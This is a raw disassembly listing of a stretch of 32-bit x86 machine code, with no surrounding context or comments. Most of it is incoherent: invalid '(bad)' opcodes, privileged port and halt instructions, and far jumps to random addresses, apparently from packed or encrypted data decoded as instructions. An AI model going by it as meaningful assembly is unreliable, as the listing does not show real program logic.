  40880c:	push   eax
  40880d:	add    edi,DWORD PTR [ebx+0x20156031]
  408813:	or     bh,ah
  408815:	popf   
  408816:	sbb    edx,DWORD PTR [edx]
  408818:	dec    eax
  408819:	call   0x688b6f
  40881e:	xchg   ebp,eax
  40881f:	sbb    dh,BYTE PTR [ebx]
  408821:	xchg   ebx,ebx
  408823:	sbb    al,0xd0
  408825:	icebp  
  408826:	sub    BYTE PTR [ecx-0x13],bh
  408829:	cmp    ebp,edi
  40882b:	mov    bl,0x4
  40882d:	ja     0x408843
  40882f:	or     eax,DWORD PTR [esp+eiz*4+0x51d9fdce]
  408836:	fst    QWORD PTR [ebp+0x3b8b86c5]
  40883c:	sar    cl,0xe7
  40883f:	nop
  408840:	test   BYTE PTR [eax+0x37],dl
  408843:	sbb    eax,DWORD PTR [edx+0x61]
  408846:	fwait
  408847:	test   BYTE PTR [ebx+0xa88bdf8],bh
  40884d:	into   
  40884e:	aaa    
  40884f:	and    BYTE PTR [edx+0x5c],0x17
  408853:	fadd   DWORD PTR [edx-0x53]
  408856:	add    ch,dh
  408858:	inc    ecx
  408859:	push   ds
  40885a:	aam    0x2c
  40885c:	pop    esp
  40885d:	jmp    0x40887f
  40885f:	mov    es,ebx
  408861:	in     al,dx
  408862:	mov    eax,ds:0x7c28c5da
  408867:	mov    ebp,DWORD PTR [esi]
  408869:	jge    0x40881e
  40886b:	mov    cl,0x46
  40886d:	cmp    cl,BYTE PTR [esi+esi*1+0x29]
  408871:	daa    
  408872:	pusha  
  408873:	les    esp,FWORD PTR [ecx]
  408875:	and    al,0x71
  408877:	and    al,0xb1
  408879:	cmp    DWORD PTR [edi-0x22],esp
  40887c:	cmp    edi,DWORD PTR [eax]
  40887e:	sti    
  40887f:	sbb    DWORD PTR [edx],ecx
  408881:	and    BYTE PTR [esi+edx*1],al
  408884:	sbb    edi,DWORD PTR [esi-0x1c]
  408887:	mov    esp,DWORD PTR [eax]
  408889:	adc    eax,0xd94c5874
  40888e:	jp     0x408844
  408890:	sub    al,0x4a
  408892:	sar    BYTE PTR [eax-0x24],cl
  408895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408896:	sub    dl,ch
  408898:	hlt    
  408899:	cmp    esp,esp
  40889b:	pop    ebx
  40889c:	stos   DWORD PTR es:[edi],eax
  40889d:	ds cmp ah,0x54
  4088a1:	push   ebp
  4088a2:	and    ebp,DWORD PTR [ebx]
  4088a4:	cmp    DWORD PTR [edx],ecx
  4088a6:	fisub  WORD PTR [edi-0x1c]
  4088a9:	jg     0x4088a2
  4088ab:	test   BYTE PTR ds:0x628574f8,al
  4088b1:	jo     0x40892b
  4088b3:	inc    ebp
  4088b4:	idiv   BYTE PTR [edi]
  4088b6:	fistp  QWORD PTR [ecx-0x3ef4fbcc]
  4088bc:	mov    esp,0xf64b142c
  4088c1:	sbb    al,0xa0
  4088c3:	popa   
  4088c4:	xor    ebp,DWORD PTR [ebx+0x1d2d96c7]
  4088ca:	mov    ecx,0x38ac93e3
  4088cf:	jmp    0x40891d
  4088d1:	mov    DWORD PTR ds:0x918d2352,edx
  4088d7:	loopne 0x4088a9
  4088d9:	mov    BYTE PTR [edx-0x5b71a5bc],dl
  4088df:	in     al,0x27
  4088e1:	div    edi
  4088e3:	scas   eax,DWORD PTR es:[edi]
  4088e4:	jle    0x40892a
  4088e6:	outs   dx,BYTE PTR ds:[esi]
  4088e7:	and    al,0x1f
  4088e9:	adc    eax,0x6d4e099d
  4088ee:	fstp   QWORD PTR [ecx-0x5c34c81a]
  4088f4:	sub    BYTE PTR [ebx+0x13431827],0x51
  4088fb:	nop
  4088fc:	paddsb mm5,QWORD PTR [ebx]
  4088ff:	out    dx,eax
  408900:	fstp   TBYTE PTR [esi+ebx*4+0x5f200181]
  408907:	iret   
  408908:	sub    BYTE PTR gs:[ebp-0x40],dl
  40890c:	xor    eax,0xbf33a7d
  408911:	mov    edx,0x4bd72073
  408916:	rcl    ebp,cl
  408918:	rcr    BYTE PTR [esp+esi*2-0x2c24efb9],0xf4
  408920:	inc    eax
  408921:	inc    edi
  408922:	dec    esp
  408923:	push   es
  408924:	and    al,0x84
  408926:	inc    eax
  408927:	mov    cl,0x18
  408929:	or     dl,dl
  40892b:	test   eax,0xfacf377
  408930:	in     eax,dx
  408931:	mov    edx,0x278442e7
  408936:	adc    BYTE PTR [ebx+0xa],al
  408939:	push   0xeeecc25b
  40893e:	or     BYTE PTR [esi],0xe7
  408941:	call   0xb6d9:0xbe15d5d1
  408948:	mov    ebx,0x211e8d35
  40894d:	sub    al,0x82
  40894f:	push   ss
  408950:	loopne 0x4088de
  408952:	cmp    ch,BYTE PTR [ebp-0x5d9b694a]
  408958:	mov    dh,BYTE PTR [ecx-0x1]
  40895b:	and    ebx,DWORD PTR [ebx+0x64e365c8]
  408961:	lahf   
  408962:	in     al,0xf5
  408964:	sub    al,0x69
  408966:	and    eax,0xb27f9b7e
  40896b:	jno    0x40899c
  40896d:	(bad)  
  40896e:	retf   
  40896f:	(bad)  [edx-0x5a9afa7d]
  408975:	dec    esp
  408976:	test   eax,0xcbbc7eaf
  40897b:	in     al,0x36
  40897d:	out    dx,al
  40897e:	test   al,0xfd
  408980:	inc    ebp
  408981:	stc    
  408982:	add    bl,BYTE PTR [ecx]
  408984:	(bad)  
  408985:	rep stos DWORD PTR es:[edi],eax
  408987:	sub    ch,BYTE PTR [eax]
  408989:	mov    WORD PTR [ecx],fs
  40898b:	imul   esi,DWORD PTR [esi+0x5136b8f1],0x359dd4af
  408995:	cmp    dl,BYTE PTR ds:0x10306bc6
  40899b:	sar    BYTE PTR [eax+0x59a5533],0xd6
  4089a2:	daa    
  4089a3:	mov    ch,BYTE PTR [eax+0x26]
  4089a6:	xor    esp,ebx
  4089a8:	push   esi
  4089a9:	mov    bh,0x75
  4089ab:	mov    edi,0x37a806a2
  4089b0:	mov    bh,0xa6
  4089b2:	inc    DWORD PTR [edx-0x22]
  4089b5:	dec    ebx
  4089b6:	adc    dl,BYTE PTR [esi]
  4089b8:	std    
  4089b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089ba:	das    
  4089bb:	f2xm1  
  4089bd:	push   edx
  4089be:	stos   BYTE PTR es:[edi],al
  4089bf:	(bad)  
  4089c0:	cmp    eax,0x30e365cc
  4089c5:	std    
  4089c6:	mov    ecx,0xaa711dc8
  4089cb:	pop    ds
  4089cc:	fldenv [eax]
  4089ce:	ins    BYTE PTR es:[edi],dx
  4089cf:	lahf   
  4089d0:	rcr    BYTE PTR [esi+0x680160de],cl
  4089d6:	mov    al,ds:0xd68964b3
  4089db:	add    bl,BYTE PTR [edi+0x6da3380b]
  4089e1:	push   ebp
  4089e2:	xchg   DWORD PTR [ecx-0x4289a7fc],ebp
  4089e8:	mov    cl,0x53
  4089ea:	iret   
  4089eb:	inc    ebp
  4089ec:	xchg   esp,eax
  4089ed:	mov    ds:0x2bcbe1ad,al
  4089f2:	dec    edx
  4089f3:	cmp    bl,BYTE PTR [ebp+0x5e]
  4089f6:	call   0xc577317f
  4089fb:	inc    ebx
  4089fc:	test   BYTE PTR [edi-0x5ef03f30],bl
  408a02:	or     al,BYTE PTR [ebp+eiz*1+0x30]
  408a06:	test   al,0x82
  408a08:	cmp    DWORD PTR ds:[edi-0x50],ecx
  408a0c:	mov    eax,0xf04986e0
  408a11:	jmp    0x8367ab31
  408a16:	inc    edx
  408a17:	mov    edi,0x9ff56123
  408a1c:	imul   edx,DWORD PTR [edx-0x6434b74e],0xffffffb1
  408a23:	rcl    DWORD PTR [ebx-0xe],0x1d
  408a27:	jnp    0x4089da
  408a29:	fwait
  408a2a:	cmp    al,cl
  408a2c:	inc    esp
  408a2d:	aad    0x9
  408a2f:	arpl   WORD PTR [ebp-0x53],ax
  408a32:	test   BYTE PTR [edx+0x6c],cl
  408a35:	je     0x408a36
  408a37:	loop   0x408a15
  408a39:	dec    edi
  408a3a:	shl    DWORD PTR [ebx-0x1e],cl
  408a3d:	aas    
  408a3e:	inc    edx
  408a3f:	hlt    
  408a40:	jno    0x4089de
  408a42:	sub    al,0xe5
  408a44:	sbb    dh,BYTE PTR [ebx]
  408a46:	sar    ecx,cl
  408a48:	sti    
  408a49:	and    al,0xfd
  408a4b:	jne    0x4089e4
  408a4d:	dec    edx
  408a4e:	pop    ss
  408a4f:	popa   
  408a50:	out    dx,eax
  408a51:	sahf   
  408a52:	pop    ecx
  408a53:	in     eax,0x75
  408a55:	xchg   ecx,eax
  408a56:	hlt    
  408a57:	cs ret 
  408a59:	into   
  408a5a:	popa   
  408a5b:	or     eax,0x2c802622
  408a60:	popa   
  408a61:	sub    al,0xcd
  408a63:	(bad)  
  408a65:	push   ss
  408a66:	outs   dx,DWORD PTR ds:[esi]
  408a67:	aam    0xfa
  408a69:	jae    0x408a0a
  408a6b:	sbb    bl,BYTE PTR es:[ecx-0x2c]
  408a6f:	cmp    ch,BYTE PTR [esi+0x3a0d42d6]
  408a75:	jne    0x408aa2
  408a77:	mov    dh,0xd5
  408a79:	shl    BYTE PTR [ebp+0x21],1
  408a7c:	hlt    
  408a7d:	sti    
  408a7e:	fidiv  WORD PTR [edi+0x14e68802]
  408a84:	les    ecx,FWORD PTR gs:[eax]
  408a87:	xlat   BYTE PTR ds:[ebx]
  408a88:	std    
  408a89:	stos   BYTE PTR es:[edi],al
  408a8a:	ja     0x408b06
  408a8c:	(bad)  
  408a8d:	in     al,0xfb
  408a8f:	inc    ebx
  408a90:	pop    ss
  408a91:	jl     0x408a2a
  408a93:	add    eax,0xe70c649d
  408a98:	cmp    eax,0x2fed7198
  408a9d:	into   
  408a9e:	js     0x408b07
  408aa0:	outs   dx,BYTE PTR ds:[esi]
  408aa1:	pop    eax
  408aa2:	stos   BYTE PTR es:[edi],al
  408aa3:	div    edx
  408aa5:	fsub   st(2),st
  408aa7:	loopne 0x408a56
  408aa9:	ss jbe 0x408a2c
  408aac:	int3   
  408aad:	add    cl,BYTE PTR [esi-0x3d]
  408ab0:	(bad)  
  408ab2:	mov    ds:0x80946683,al
  408ab7:	inc    ebp
  408ab8:	pop    ds
  408ab9:	push   ss
  408aba:	mov    ah,0x78
  408abc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408abd:	adc    esp,DWORD PTR [ecx-0x32]
  408ac0:	xor    dh,BYTE PTR [eax-0x22]
  408ac3:	sbb    eax,0xea76df53
  408ac8:	inc    ebx
  408ac9:	pop    esp
  408aca:	arpl   bx,sp
  408acc:	or     edx,DWORD PTR [ebp-0x34]
  408acf:	jb     0x408a76
  408ad1:	push   ebp
  408ad2:	lock hlt 
  408ad4:	test   DWORD PTR [ebx-0x36a17cdb],ebp
  408ada:	jp     0x408a76
  408adc:	or     BYTE PTR [eax-0x1c],ch
  408adf:	mov    ch,0x9a
  408ae1:	adc    al,0x35
  408ae3:	add    cl,bh
  408ae5:	push   ds
  408ae6:	(bad)  
  408aea:	psllq  mm1,QWORD PTR [edi+ebp*8+0x12f50fc9]
  408af2:	push   0xffffffa1
  408af4:	std    
  408af5:	fcom   DWORD PTR [ecx+0x45d0711a]
  408afb:	jno    0x408afb
  408afd:	scas   al,BYTE PTR es:[edi]
  408afe:	or     ecx,DWORD PTR [ecx]
  408b00:	pop    ecx
  408b01:	adc    esi,esp
  408b03:	xor    al,0x2
  408b05:	push   es
  408b06:	and    DWORD PTR [edx+0x64],edx
  408b09:	mov    bh,0x75
  408b0b:	sbb    ebx,ebx
  408b0d:	or     DWORD PTR [eax+0x3719d028],0xffffffd7
  408b14:	int3   
  408b15:	xchg   esi,eax
  408b16:	push   0x33
  408b18:	ins    DWORD PTR es:[edi],dx
  408b19:	jl     0x408b7f
  408b1b:	inc    ecx
  408b1c:	jmp    0x5d260455
  408b21:	add    ebx,DWORD PTR [edi]
  408b23:	cmp    eax,DWORD PTR [ebp+0x1d]
  408b26:	sub    al,0x5e
  408b28:	pop    eax
  408b29:	repnz repnz in eax,dx
  408b2c:	mov    bh,0x27
  408b2e:	retf   
  408b2f:	loope  0x408b49
  408b31:	or     eax,ebp
  408b33:	xor    dh,ah
  408b35:	xchg   ebp,eax
  408b36:	ss scas al,BYTE PTR es:[edi]
  408b38:	stc    
  408b39:	pop    edx
  408b3a:	aas    
  408b3b:	in     eax,0x81
  408b3d:	pop    ds
  408b3e:	sar    ch,0x30
  408b41:	stos   BYTE PTR es:[edi],al
  408b42:	scas   eax,DWORD PTR es:[edi]
  408b43:	mov    ecx,0x76ef498f
  408b48:	or     BYTE PTR [ebp-0x78ba70c4],ah
  408b4e:	and    DWORD PTR ds:0x57cf59aa,edx
  408b54:	lea    ecx,[edi-0x7f]
  408b57:	int    0xe5
  408b59:	cmc    
  408b5a:	ficom  DWORD PTR [edx-0x1]
  408b5d:	sub    al,0x74
  408b5f:	cmp    BYTE PTR [ecx+0x49],bh
  408b62:	or     eax,0x6b14dd21
  408b67:	mov    ds:0xfca0d635,eax
  408b6c:	mov    DWORD PTR ds:0xcf9a568e,edi
  408b72:	mov    ecx,0xa2e21628
  408b77:	test   eax,0xc828dbaa
  408b7c:	repz push edi
  408b7e:	pop    ecx
  408b7f:	(bad)  
  408b80:	fistp  WORD PTR [eax+0x2cd74915]
  408b86:	jo     0x408b26
  408b88:	lea    esp,[edi]
  408b8a:	arpl   WORD PTR [esi+0x2aa66259],sp
  408b90:	cld    
  408b91:	mov    edx,DWORD PTR [esi+0x39]
  408b94:	cli    
  408b95:	xchg   ecx,eax
  408b96:	pop    ss
  408b97:	inc    edi
  408b98:	mul    BYTE PTR [edx+0x29]
  408b9b:	sub    BYTE PTR [ebx],bh
  408b9d:	sbb    eax,0xab6a87f3
  408ba2:	and    eax,0xb7926d68
  408ba7:	mov    ebx,0x1cf04800
  408bac:	add    ebx,eax
  408bae:	rcr    BYTE PTR [eax+edx*1],0x83
  408bb2:	xor    edi,DWORD PTR [edi-0x2a]
  408bb5:	sub    eax,0xb149b21
  408bba:	clc    
  408bbb:	retf   0x33c8
  408bbe:	cli    
  408bbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bc0:	frstor [esi]
  408bc2:	inc    esp
  408bc3:	xor    esp,esi
  408bc5:	es push edx
  408bc7:	out    dx,eax
  408bc8:	sbb    dh,0xd4
  408bcb:	jmp    DWORD PTR [esp+ecx*8]
  408bce:	sbb    al,0xa1
  408bd0:	(bad)
  408bd3:	ins    BYTE PTR es:[edi],dx
  408bd4:	retf   
  408bd5:	das    
  408bd6:	lods   al,BYTE PTR ds:[esi]
  408bd7:	das    
  408bd8:	(bad)  
  408bd9:	sti    
  408bda:	mov    ds:0x9294117b,eax
  408bdf:	(bad)  
  408be0:	pop    ebx
  408be1:	add    DWORD PTR [ebx],0xfeb0ca72
  408be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408be8:	dec    esp
  408be9:	(bad)  
  408bea:	(bad)  
  408beb:	fidivr WORD PTR [esi+edi*1]
  408bee:	xor    dh,ah
  408bf0:	(bad)  
  408bf1:	jae    0x408c20
  408bf3:	(bad)  [ebx-0x27d645c8]
  408bf9:	adc    DWORD PTR [ebx+0x25],eax
  408bfc:	jo     0x408c4f
  408bfe:	mov    dl,0xe1
  408c00:	mov    al,ds:0xcce78c1
  408c05:	sub    eax,0xbd96957f
  408c0a:	pop    edx
  408c0b:	lea    esi,[eax+esi*2]
  408c0e:	mov    esp,0xbf965aa8
  408c13:	cmp    BYTE PTR [esi],bh
  408c15:	popa   
  408c16:	test   ecx,esi
  408c18:	pop    esp
  408c19:	popa   
  408c1a:	sbb    al,0x35
  408c1c:	sahf   
  408c1d:	push   es
  408c1e:	and    eax,0xbc20329d
  408c23:	sub    al,0x95
  408c25:	cdq    
  408c26:	jne    0x408c35
  408c28:	das    
  408c29:	pop    ss
  408c2a:	call   0x48500d0d
  408c2f:	push   ss
  408c30:	sahf   
  408c31:	out    dx,eax
  408c32:	sar    BYTE PTR [edx+0x33],cl
  408c35:	push   ebp
  408c36:	lods   eax,DWORD PTR ds:[esi]
  408c37:	sub    ecx,DWORD PTR [esp+esi*8-0x3d]
  408c3b:	ja     0x408cb7
  408c3d:	inc    ax
  408c3f:	sar    DWORD PTR ss:[eax-0x59b914dd],0x8b
  408c47:	ror    BYTE PTR [ecx+0x57210d07],1
  408c4d:	inc    esp
  408c4e:	xor    ebp,DWORD PTR [eax+ecx*1-0x14]
  408c52:	xor    al,0xf4
  408c54:	clc    
  408c55:	jne    0x408bf8
  408c57:	xchg   ecx,eax
  408c58:	imul   edi,eax,0xa
  408c5b:	mov    ds:0x6439d721,al
  408c60:	push   eax
  408c61:	dec    esi
  408c62:	mov    ch,0xc4
  408c64:	inc    di
  408c66:	inc    ebx
  408c67:	jecxz  0x408c05
  408c69:	std    
  408c6a:	popf   
  408c6b:	test   BYTE PTR [eax],bl
  408c6d:	jns    0x408c78
  408c6f:	jae    0x408cef
  408c71:	pop    ecx
  408c72:	dec    ebx
  408c73:	mov    DWORD PTR [ebx-0x1f482974],eax
  408c79:	push   es
  408c7a:	adc    eax,ebx
  408c7c:	pop    ss
  408c7d:	sbb    dh,dl
  408c7f:	lds    esp,FWORD PTR [eax+0x4ee148f2]
  408c85:	in     eax,dx
  408c86:	in     eax,0x8
  408c88:	pop    ebp
  408c89:	mov    al,0x4
  408c8b:	in     al,dx
  408c8c:	inc    edx
  408c8d:	adc    DWORD PTR [ecx+edi*4+0x27],ecx
  408c91:	(bad)  
  408c92:	stos   BYTE PTR es:[edi],al
  408c93:	sub    al,0xc6
  408c95:	sbb    eax,0x33502a6b
  408c9a:	stos   BYTE PTR es:[edi],al
  408c9b:	push   ebx
  408c9c:	stc    
  408c9d:	out    0x56,al
  408c9f:	xor    eax,0x29b6f485
  408ca4:	lods   eax,DWORD PTR ds:[esi]
  408ca5:	ror    DWORD PTR [ecx-0x2c],cl
  408ca8:	(bad)  
  408ca9:	rcr    BYTE PTR [edi],cl
  408cab:	cwde   
  408cac:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  408cae:	mov    ecx,0xc2f0b4a7
  408cb3:	push   ds
  408cb4:	loopne 0x408cb3
  408cb6:	lods   al,BYTE PTR ds:[esi]
  408cb7:	mov    ebp,esi
  408cb9:	cmc    
  408cba:	in     al,dx
  408cbb:	sub    BYTE PTR [ecx+0x3b],bl
  408cbe:	push   eax
  408cbf:	(bad)  
  408cc0:	out    dx,al
  408cc1:	and    ebx,esi
  408cc3:	mov    bh,0x5e
  408cc5:	sub    BYTE PTR [ebx-0x42d8b8a7],dh
  408ccb:	sbb    ebx,0xa7e18928
  408cd1:	cmp    BYTE PTR [ebx-0x402cf7a4],bl
  408cd7:	fwait
  408cd8:	mov    cl,0xd2
  408cda:	sub    al,0x4c
  408cdc:	sti    
  408cdd:	mov    fs,WORD PTR [ecx+0x10]
  408ce0:	out    0x15,al
  408ce2:	ins    BYTE PTR es:[edi],dx
  408ce3:	inc    ecx
  408ce4:	std    
  408ce5:	xor    ebp,esp
  408ce7:	aaa    
  408ce8:	cmp    al,0x3f
  408cea:	cwde   
  408ceb:	dec    eax
  408cec:	dec    edx
  408ced:	inc    esi
  408cee:	stos   BYTE PTR es:[edi],al
  408cef:	ins    BYTE PTR es:[edi],dx
  408cf0:	sub    al,0x52
  408cf2:	or     eax,0x2ef45a79
  408cf7:	push   es
  408cf8:	dec    esp
  408cf9:	push   ds
  408cfa:	and    eax,0xe8917704
  408cff:	gs and eax,0x102972d1
  408d05:	xchg   ebp,eax
  408d06:	jnp    0x408d49
  408d08:	push   cs
  408d09:	and    al,0x2c
  408d0b:	mov    al,0x27
  408d0d:	ja     0x408d0f
  408d0f:	aaa    
  408d10:	retf   0xf4cc
  408d13:	(bad)  
  408d14:	jno    0x408d46
  408d16:	adc    eax,0x8481f66d
  408d1b:	je     0x408d4a
  408d1d:	jo     0x408d1d
  408d1f:	rcr    BYTE PTR [ecx-0x2d],0x5f
  408d23:	dec    ebp
  408d24:	adc    eax,0x42fdb7a
  408d29:	inc    ebp
  408d2a:	fdiv   DWORD PTR [edi-0x4e]
  408d2d:	ds call 0xb911:0x61f71aca
  408d35:	in     eax,0x7a
  408d37:	pop    ds
  408d38:	or     ebx,DWORD PTR [esi+0x4cfe8e62]
  408d3e:	sub    ah,bh
  408d40:	mov    al,ds:0xf6b2e916
  408d45:	retf   
  408d46:	rcr    ebp,cl
  408d48:	adc    cl,BYTE PTR [esi+ebx*2+0x2a9f4f3c]
  408d4f:	imul   ebx,DWORD PTR [ecx],0x2bbd51b5
  408d55:	imul   ebx,DWORD PTR [ebp-0x18],0x10
  408d59:	leave  
  408d5a:	pop    ebx
  408d5b:	scas   eax,DWORD PTR es:[edi]
  408d5c:	out    dx,al
  408d5d:	push   ebp
  408d5e:	mov    esi,0xa4bb6d0d
  408d63:	xchg   DWORD PTR [esi+0x63cac4c],ebp
  408d69:	jb     0x408d25
  408d6b:	xor    cl,BYTE PTR [esi]
  408d6d:	pop    ebp
  408d6e:	sbb    ecx,DWORD PTR [esi+0x17cb89be]
  408d74:	push   es
  408d75:	int3   
  408d76:	xlat   BYTE PTR ds:[ebx]
  408d77:	dec    ebp
  408d78:	sub    bh,BYTE PTR [eax+ecx*4-0x9]
  408d7c:	pop    ss
  408d7d:	dec    esp
  408d7e:	push   0x3bf3cc8e
  408d83:	adc    al,0xe7
  408d85:	mov    al,ds:0xd8cde50b
  408d8a:	inc    eax
  408d8b:	frstor [eax-0x3812ca4e]
  408d91:	out    dx,eax
  408d92:	loopne 0x408d37
  408d94:	cmp    DWORD PTR [edi],esp
  408d96:	cli    
  408d97:	push   edx
  408d98:	fadd   st,st(4)
  408d9a:	ja     0x408e09
  408d9c:	sub    eax,0xf1338461
  408da1:	mov    eax,0xac59a3c9
  408da6:	pop    esi
  408da7:	int    0x33
  408da9:	push   ebp
  408daa:	and    eax,DWORD PTR [edi+0x57]
  408dad:	outs   dx,BYTE PTR ds:[esi]
  408dae:	les    edx,FWORD PTR [ecx-0x4b]
  408db1:	xchg   BYTE PTR [ebx+0x600808ca],ah
  408db7:	or     eax,0xde9bec9c
  408dbc:	pop    ebx
  408dbd:	inc    ecx
  408dbe:	jmp    0xbed872f5
  408dc3:	(bad)  
  408dc5:	dec    ebx
  408dc6:	pop    ebp
  408dc7:	pusha  
  408dc8:	je     0x408d8f
  408dca:	cld    
  408dcb:	cmc    
  408dcc:	popa   
  408dcd:	call   0x2015:0xef098ce7
  408dd4:	in     al,dx
  408dd5:	or     al,0x88
  408dd7:	loope  0x408e24
  408dd9:	mov    edi,0xeb0b7cdf
  408dde:	fadd   QWORD PTR [eax]
  408de0:	or     DWORD PTR [ebx],esp
  408de2:	jl     0x408ded
  408de4:	(bad)  
  408de5:	clc    
  408de6:	leave  
  408de7:	ss aaa 
  408de9:	pop    edi
  408dea:	dec    ebp
  408deb:	addr16 dec ecx
  408ded:	xor    ecx,ebx
  408def:	mov    ebp,0xed66edde
  408df4:	out    0xbc,al
  408df6:	dec    ecx
  408df7:	jns    0x408e18
  408df9:	mov    esi,0xbaaa32ee
  408dfe:	or     bh,ch
  408e00:	and    edx,0xbc0633a9
  408e06:	jecxz  0x408e4c
  408e08:	jp     0x408deb
  408e0a:	mov    dl,ch
  408e0c:	loopne 0x408e89
  408e0e:	fidivr WORD PTR [edx+0x76d9bcf3]
  408e14:	and    al,0xaa
  408e16:	xchg   DWORD PTR [ebp+esi*1-0x44],ecx
  408e1a:	sub    dl,dh
  408e1c:	xor    cl,BYTE PTR [esi+0x4e]
  408e1f:	loop   0x408dbe
  408e21:	fld    DWORD PTR [eax+0x45a040f9]
  408e27:	pop    ebp
  408e28:	cmc    
  408e29:	jmp    0x17df:0xbbd33d85
  408e30:	push   cs
  408e31:	adc    DWORD PTR [edi-0x3996e7e7],esp
  408e37:	adc    eax,0x7fa6fcda
  408e3c:	inc    edx
  408e3d:	and    BYTE PTR [eax+ecx*4+0x6b],bh
  408e41:	push   0xffffff94
  408e43:	es jo  0x408df5
  408e46:	loop   0x408ebf
  408e48:	hlt    
  408e49:	fs push ebp
  408e4b:	and    BYTE PTR [esi-0x40],ch
  408e4e:	scas   eax,DWORD PTR es:[edi]
  408e4f:	sbb    DWORD PTR [ecx],esi
  408e51:	out    0x50,al
  408e53:	aaa    
  408e54:	xor    BYTE PTR [esi],dh
  408e56:	inc    eax
  408e57:	or     DWORD PTR [edx-0x23c11edd],ebp
  408e5d:	xor    ah,BYTE PTR [ebx+0x6bc479e6]
  408e63:	xchg   ebx,eax
  408e64:	sub    DWORD PTR [edx+0x32b971a0],eax
  408e6a:	pop    esi
  408e6b:	and    al,BYTE PTR [ecx+0x6e96b31c]
  408e71:	stc    
  408e72:	ins    BYTE PTR es:[edi],dx
  408e73:	stos   BYTE PTR es:[edi],al
  408e74:	(bad)  
  408e75:	jbe    0x408ea7
  408e77:	mov    ch,0x81
  408e79:	je     0x408ed4
  408e7b:	pop    esp
  408e7c:	ret    0x4d12
  408e7f:	inc    ecx
  408e80:	cmp    edi,DWORD PTR [esi+ecx*2-0x2d]
  408e84:	cmp    al,0x95
  408e86:	fild   WORD PTR [esi+0x28]
  408e89:	daa    
  408e8a:	push   0xa240a5bc
  408e8f:	jge    0x408e7e
  408e91:	gs (bad) 
  408e94:	cli    
  408e95:	ss push edi
  408e97:	imul   edx,DWORD PTR [edx],0x5fece532
  408e9d:	ss sbb al,0x3b
  408ea0:	clc    
  408ea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ea2:	sub    eax,0xd80c30bf
  408ea7:	add    BYTE PTR [esi-0x4d0c70a1],bl
  408ead:	mov    ch,0xe0
  408eaf:	cmp    eax,0x43e90201
  408eb4:	fbstp  TBYTE PTR ds:0xc6f8414
  408eba:	mov    al,0xf9
  408ebc:	test   eax,0x4496d968
  408ec1:	aam    0x30
  408ec3:	ja     0x408e45
  408ec5:	jns    0x408e75
  408ec7:	mov    dl,0xfe
  408ec9:	and    DWORD PTR [esi+0x68bb0c28],ebp
  408ecf:	iret   
  408ed0:	or     edx,DWORD PTR [ebp+ebx*4+0x7ec55e84]
  408ed7:	mov    ebp,0x72cfdba5
  408edc:	mov    esp,0x42993dcd
  408ee1:	cmc    
  408ee2:	adc    al,0x11
  408ee4:	inc    esp
  408ee5:	addr16 inc edi
  408ee7:	imul   esp,ecx,0xa67b008e
  408eed:	pop    edi
  408eee:	dec    ecx
  408eef:	mov    ds:0xf714889,al
  408ef4:	sub    DWORD PTR [ebx+0x12],edx
  408ef7:	mov    ebp,0x50a8065c
  408efc:	mov    ds:0x754697ca,eax
  408f01:	add    BYTE PTR [esi],cl
  408f03:	scas   eax,DWORD PTR es:[edi]
  408f04:	(bad)  
  408f05:	fnstcw WORD PTR [ebx-0x5b]
  408f08:	out    dx,eax
  408f09:	jns    0x408e98
  408f0b:	xor    cl,al
  408f0d:	loop   0x408e92
  408f0f:	dec    eax
  408f10:	xchg   esi,eax
  408f11:	jecxz  0x408e9a
  408f13:	bswap  eax
  408f15:	div    BYTE PTR fs:[edi+0x38a0d55c]
  408f1c:	pop    ds
  408f1d:	mov    bl,0xc5
  408f1f:	loop   0x408eeb
  408f21:	popf   
  408f22:	aad    0x48
  408f24:	ins    DWORD PTR es:[edi],dx
  408f25:	mov    dl,0x45
  408f27:	cmp    edi,ebx
  408f29:	dec    ebx
  408f2a:	and    al,0xf0
  408f2c:	jl     0x408fa8
  408f2e:	and    al,0x71
  408f30:	aad    0x88
  408f32:	jnp    0x408faa
  408f34:	les    ebp,FWORD PTR [ebx+0xc]
  408f37:	fs or  al,0xc
  408f3a:	repz mov ecx,0x893039d9
  408f40:	sbb    dh,BYTE PTR [ebp+ebx*1-0x146dd9e2]
  408f47:	jmp    0xecf5:0x342b83e4
  408f4e:	xor    edx,DWORD PTR [ecx]
  408f50:	cdq    
  408f51:	xchg   DWORD PTR [ebx],esi
  408f53:	mov    BYTE PTR ds:[edx-0x1bbb956c],dl
  408f5a:	mov    ebp,?
  408f5c:	mov    bh,0xc8
  408f5e:	imul   edi,DWORD PTR [esi],0xffffff8c
  408f61:	push   edi
  408f62:	fmul   st,st(5)
  408f64:	aam    0xb
  408f66:	sbb    eax,edx
  408f68:	dec    esi
  408f69:	mov    ebx,0x80fadffb
  408f6f:	jbe    0x408fb9
  408f71:	jle    0x408f75
  408f73:	push   ss
  408f74:	bswap  eax
  408f76:	sub    dl,BYTE PTR [ebx+0x57]
  408f79:	mov    edi,DWORD PTR [esp+ebx*4-0x74c8a14d]
  408f80:	inc    edx
  408f81:	into   
  408f82:	hlt    
  408f83:	scas   al,BYTE PTR es:[edi]
  408f84:	push   eax
  408f85:	shr    cl,cl
  408f87:	hlt    
  408f88:	or     bl,dl
  408f8a:	push   ecx
  408f8b:	shl    DWORD PTR [ebx],0xbc
  408f8e:	das    
  408f8f:	xchg   ebx,eax
  408f90:	and    eax,0x662e1174
  408f95:	mov    WORD PTR [esi+ebp*8-0x85a0ece],?
  408f9c:	inc    edi
  408f9d:	cmp    eax,0xf65c18ad
  408fa2:	ins    DWORD PTR es:[edi],dx
  408fa3:	rol    esi,cl
  408fa5:	add    dh,BYTE PTR [eax-0x11]
  408fa8:	(bad)
  408fab:	mov    eax,ds:0x6ce7967e
  408fb0:	das    
  408fb1:	cmp    DWORD PTR [ebx-0x35fa2705],esp
  408fb7:	(bad)  
  408fb9:	lock test dh,bh
  408fbc:	dec    ecx
  408fbd:	add    eax,DWORD PTR [edx-0xbfc8f1c]
  408fc3:	dec    ebx
  408fc4:	xchg   ebx,eax
  408fc5:	aaa    
  408fc6:	push   0xa32967b3
  408fcb:	test   eax,0x302c8a6a
  408fd0:	pop    ebx
  408fd1:	mov    ebx,0x1a42b20b
